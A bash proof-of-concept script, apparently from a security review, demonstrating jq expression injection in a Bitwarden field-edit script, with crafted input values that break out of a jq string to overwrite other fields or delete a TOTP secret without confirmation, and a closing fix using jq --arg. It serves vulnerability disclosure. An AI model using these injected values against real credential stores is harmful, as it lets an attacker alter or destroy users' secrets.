#!/bin/bash
# ============================================================
# PoC #7 — jq Expression Injection via Field Edit Value (HIGH)
# Vulnerability: bin/get_new_field.sh:22
#
#   curl -s "${URL}" \
#       | jq ".data | ${jqItem} |= \"$(cut -d: -f3 <<< "${new}")\"" \
#       | curl -s -H 'Content-Type: application/json' -T - "${URL}" \
#       | jq .success
#
# The user's new field value (${new}) is split on ':' and the third
# segment is embedded directly into a jq filter expression.  A value
# that escapes the surrounding double-quotes (using \") can break out
# of the string context and inject arbitrary jq code.
#
# This PoC demonstrates:
#   A) Normal field edit to establish a baseline
#   B) Injection that escapes the string context
#   C) Injection that modifies a different field than intended
#   D) Injection that deletes a field (simulating remove without the
#      remove dialog confirmation)
# ============================================================

# Sample Bitwarden item returned by GET /object/item/<id>
SAMPLE_ITEM='{
  "success": true,
  "data": {
    "id": "test-item-id-0001",
    "type": 1,
    "name": "Test Login",
    "login": {
      "username": "alice@example.com",
      "password": "original_password",
      "totp": "JBSWY3DPEHPK3PXP",
      "uris": [{"match": null, "uri": "https://example.com"}]
    },
    "notes": "original notes",
    "favorite": false
  }
}'

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }

# Reproduce the vulnerable filter from get_new_field.sh:22
# ${new} is the raw osascript output: "button returned:OK, text returned:VALUE"
# cut -d: -f3 extracts the third ':'-delimited field, which is the user value.
run_filter() {
    local jq_item="$1"   # e.g. .login.password
    local new_raw="$2"   # raw ${new} string (osascript output format)

    # Reproduce what the script does
    local extracted
    extracted=$(cut -d: -f3 <<< "${new_raw}")

    echo "[*] Raw osascript output : ${new_raw}"
    echo "[*] After cut -d: -f3    : ${extracted}"
    echo "[*] jq filter            : .data | ${jq_item} |= \"${extracted}\""
    echo

    echo "${SAMPLE_ITEM}" | jq ".data | ${jq_item} |= \"${extracted}\"" 2>&1
}

# ---------- Part A: Baseline ----------
banner "Part A — Baseline: legitimate password update"

# osascript returns: "button returned:OK, text returned:new_password"
# cut -d: -f3 gives: " text returned" — wait, actually:
# "button returned:OK, text returned:new_password" split on ':' gives:
#   f1="button returned"  f2="OK, text returned"  f3="new_password"
NEW_NORMAL="button returned:OK, text returned:new_secure_password"
run_filter ".login.password" "${NEW_NORMAL}"
echo
ok "Expected: password updated to 'new_secure_password'."

# ---------- Part B: Escape the jq string context ----------
banner "Part B — Escape string context via bare double-quote"

# The jq filter template in get_new_field.sh:22 is:
#   jq ".data | ${jqItem} |= \"$(cut -d: -f3 <<< "${new}")\""
#
# After bash expansion, jq receives:
#   .data | .login.password |= "USER_INPUT"
#
# The surrounding \" are bash escape sequences that produce literal "
# in the argument string.  However, a bare " character inside
# USER_INPUT (coming from the $(…) substitution) is passed through
# unchanged because bash does NOT re-process variable expansion content
# for quoting.
#
# So a user input containing a bare " closes the jq string literal and
# the remainder is parsed as additional jq code.
#
# Injection:  "button returned:OK, text returned:" | .favorite = true ..."
# cut f3:    '" | .favorite = true | .login.password = "INJECTED'
# jq arg:    '.data | .login.password |= "" | .favorite = true | .login.password = "INJECTED"'

INJECT_B='button returned:OK, text returned:" | .favorite = true | .login.password = "INJECTED'
echo "Injected new value (osascript output):"
echo "  ${INJECT_B}"
echo

run_filter ".login.password" "${INJECT_B}"
echo
ok "RESULT: The jq expression breaks out of the string assignment."
ok "        Both .favorite and .login.password are set by the injected code."
ok "        The victim intended only to change the password field."

# ---------- Part C: Modify a different field than intended ----------
banner "Part C — Modify unintended field (notes override)"

# Editing 'username' but also overwriting 'notes' via injection.
INJECT_C='button returned:OK, text returned:hacker" | .notes = "NOTES HIJACKED" | .login.username = "hacker'
echo "Injected new username (osascript output):"
echo "  ${INJECT_C}"
echo

run_filter ".login.username" "${INJECT_C}"
echo
ok "RESULT: The username edit silently overwrites the 'notes' field as well."

# ---------- Part D: Delete field without confirmation dialog ----------
banner "Part D — Bypass confirmation dialog and delete a field"

# The 'remove' path in get_new_field.sh requires clicking 'Remove <field>'
# AND confirming in a second dialog.  Via injection we invoke del() directly.
INJECT_D='button returned:OK, text returned:restored" | del(.login.totp) | .login.username = "restored'
echo "Injected value that deletes TOTP without confirmation:"
echo "  ${INJECT_D}"
echo

run_filter ".login.username" "${INJECT_D}"
echo
ok "RESULT: The TOTP secret is deleted from the item without the"
ok "        two-step confirmation dialog that the workflow normally requires."

# ---------- Summary ----------
banner "Summary"
echo "Root cause: user input from 'cut -d: -f3' is embedded inside a jq"
echo "double-quoted string literal.  A bare \" character in the input closes"
echo "the string, and the remainder is executed as jq code."
echo
echo "The character that triggers the injection: a plain double-quote (\")."
echo "Users can type this in any osascript dialog — no special encoding needed."
echo
echo "Fix: use --arg to pass user input as a jq variable (never interpolate):"
echo "  jq --arg v \"\${new_value}\" \".data | \${jqItem} |= \\\$v\""
